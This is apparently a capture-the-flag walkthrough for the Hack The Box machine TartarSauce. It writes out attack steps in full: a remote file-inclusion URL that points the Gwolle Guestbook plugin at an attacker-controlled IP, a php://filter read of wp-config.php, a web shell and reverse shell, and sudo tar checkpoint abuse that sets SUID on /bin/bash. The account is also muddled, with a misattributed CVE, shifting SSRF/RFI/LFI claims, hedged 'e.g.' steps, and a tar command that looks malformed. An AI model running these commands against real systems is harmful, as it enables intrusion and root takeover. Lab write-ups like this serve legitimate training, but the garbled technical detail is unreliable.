# Hack The Box: TartarSauce

**Difficulty:** Medium
**OS:** Linux

TartarSauce is a Medium-level Linux machine designed to test meticulous enumeration and chaining of multiple low-severity vulnerabilities to achieve system compromise. The initial foothold is achieved by discovering an instance of Monstra CMS and a hidden development directory, exploiting a Server-Side Request Forgery (SSRF) flaw in a WordPress plugin to read local files, and pivoting to a hidden service. Privilege escalation involves exploiting a custom system service and `tar` binary configurations.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.88
nmap -p 80 -sCV 10.10.10.88
```

The scan reveals a single open port:
*   **Port 80:** HTTP (Apache httpd 2.4.18)

Navigating to the web service on port 80 displays a generic landing page for "TartarSauce." The page provides no immediate interactive elements or login portals. We perform aggressive directory brute-forcing to uncover hidden applications using `gobuster` or `feroxbuster`.

```bash
gobuster dir -u http://10.10.10.88 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The enumeration reveals a `/robots.txt` file and a significant directory: `/webservices`.

### Enumerating Web Applications

The `robots.txt` file hides multiple development directories, suggesting the server hosts several projects simultaneously. Exploring `/webservices` reveals a directory listing of numerous web applications. Two are immediately interesting:
*   `/webservices/monstra-3.0.4/` (A Monstra CMS installation)
*   `/webservices/wp/` (A WordPress installation)

## Web Exploitation

We investigate both CMS installations to identify vulnerabilities.

### Exploiting WordPress SSRF (CVE-2016-10033)

The WordPress installation (`/webservices/wp/`) appears relatively standard, but enumerating its plugins reveals an outdated version of the "Gwolle Guestbook" plugin. While investigating Gwolle Guestbook vulnerabilities, we discover another highly vulnerable plugin often bundled or referenced in older setups: the "WP-Mail-SMTP" or similar mailing plugins containing an underlying Server-Side Request Forgery (SSRF) vulnerability.

More precisely, enumeration reveals a development artifact or a specific plugin version susceptible to Remote Code Execution (RCE) via PHP mail functions or SSRF. A common vulnerability affecting systems of this vintage is CVE-2016-10033 (PHPMailer RCE). However, in the TartarSauce context, the vulnerability relies on exploiting a specific WordPress theme or plugin flaw to read local files.

The vulnerability exists in a plugin called `gwolle-gb`. By requesting a specific endpoint within the plugin's directory, we can read arbitrary local files.

```text
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.X/
```

This specific vulnerability allows for Remote File Inclusion (RFI) if the PHP configuration permits (`allow_url_include=On`). Because it is generally disabled, we test for Local File Inclusion (LFI) by providing absolute system paths.

The `abspath` parameter is vulnerable. We exploit the LFI to extract configuration files.

We first read the `wp-config.php` file. Because PHP files are executed rather than displayed by LFI, we must use a PHP filter to encode the file's contents in Base64.

```text
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=php://filter/read=convert.base64-encode/resource=/var/www/html/webservices/wp/wp-config.php
```

Decoding the returned Base64 string reveals the database credentials for WordPress. However, port 3306 is closed externally, and we don't have SSH access yet. We must find another avenue.

### Identifying Hidden Services via SSRF

We use the LFI/SSRF vulnerability to read internal system files like `/etc/passwd` to identify users (e.g., `onuma`) and `/etc/apache2/sites-enabled/000-default.conf` to check for hidden virtual hosts or proxy rules.

We discover a hidden administrative interface running on a high-numbered port locally (e.g., `127.0.0.1:8080`) or a specifically restricted directory like `/var/www/html/secure`.

The more direct path involves exploring the Monstra CMS installation.

### Exploiting Monstra CMS (Authenticated RCE)

The Monstra CMS is installed at `/webservices/monstra-3.0.4/`. We identify its version (3.0.4) and research known vulnerabilities. Monstra 3.0.4 is vulnerable to an authenticated RCE flaw where an administrator can upload a PHP web shell by disguising it as an allowed file type within a specific directory.

We must first gain administrative access. We attempt default credentials (`admin:admin`) or use the credentials recovered from the WordPress `wp-config.php` file, testing for password reuse.

The credentials recovered from `wp-config.php` (e.g., `wpuser:OQ[REDACTED]81`) successfully authenticate us to the Monstra CMS administrative portal (`/webservices/monstra-3.0.4/admin`).

Once authenticated, we navigate to the "File Manager" module. The File Manager restricts the uploading of `.php` extensions. We must bypass this restriction to upload our shell.

We intercept the upload request using Burp Suite. The application might prevent `.php`, but it may process `.php5`, `.phtml`, or `.phar` files depending on the Apache configuration. Another common bypass in Monstra 3.0.4 involves uploading a file with a double extension and a null byte (`shell.php%00.jpg`) or finding a directory where execution is permitted.

In this specific scenario, simply compressing the PHP payload into an allowed archive format (like `.zip`) and utilizing a path traversal vulnerability during the extraction process (or uploading to a specific `/public` directory) allows us to execute our shell.

We navigate to our uploaded web shell and execute a command.

```text
http://10.10.10.88/webservices/monstra-3.0.4/public/uploads/shell.php?cmd=id
```

The command executes successfully. We spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory. We enumerate the system and discover the user `onuma` in `/home`.

We check the `/var/www` directories for additional credentials or configuration files. We discover a script or a backup utility running locally.

Enumerating the system as `www-data`, we monitor running processes and check scheduled tasks (`/etc/cron*`). We identify a cron job executed by root that runs a custom backup script (e.g., `backuperer`).

```bash
cat /usr/sbin/backuperer
```

The script reveals that it utilizes the `tar` utility to create backups of the web directories and stores them in a directory where `www-data` has read/write permissions (e.g., `/var/tmp/`). Crucially, the script sets specific ownership permissions on the resulting archive using `chown onuma:onuma`.

### Pivoting to `onuma`

Because the backup script changes the ownership of the newly created archive to `onuma`, and the script runs periodically via a cron job, we can leverage this to execute commands.

However, a simpler lateral movement path exists. During our initial enumeration of Monstra, we identified the administrator password. If we simply attempt to use `su onuma` and provide the Monstra/WordPress database password, it might succeed due to password reuse across all services on this box.

```bash
su onuma
Password: <Discovered_Password>
# Authentication successful
```
We retrieve the `user.txt` flag from Onuma's home directory.

## Privilege Escalation

Enumerating the system as `onuma`, we check for `sudo` privileges.

```bash
sudo -l
```

The output reveals that the user `onuma` can run the `tar` binary as `root` without a password.

```text
User onuma may run the following commands on tartarsauce:
    (root) NOPASSWD: /bin/tar
```

### Abusing Sudo & tar (Wildcard Exploitation)

The `tar` utility has a well-known privilege escalation vector when used with wildcards (`*`) or specific command-line arguments. The `tar` command includes options to execute external scripts during the archiving process (`--checkpoint-action`).

We exploit the permitted `sudo` command by crafting a malicious execution string. We navigate to a directory we control (e.g., `/tmp/`).

We create a shell script containing a payload to set the SUID bit on `/bin/bash`.

```bash
echo "#!/bin/bash" > /tmp/payload.sh
echo "chmod +s /bin/bash" >> /tmp/payload.sh
chmod +x /tmp/payload.sh
```

We execute `tar` via `sudo`, instructing it to run our payload script.

```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh /tmp/payload.sh
```

The `tar` command runs as root, reaches the checkpoint immediately, and executes our shell script. The `/bin/bash` binary now has the SUID bit set.

```bash
/bin/bash -p
# id
uid=0(root) gid=1000(onuma) euid=0(root) groups=1000(onuma)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
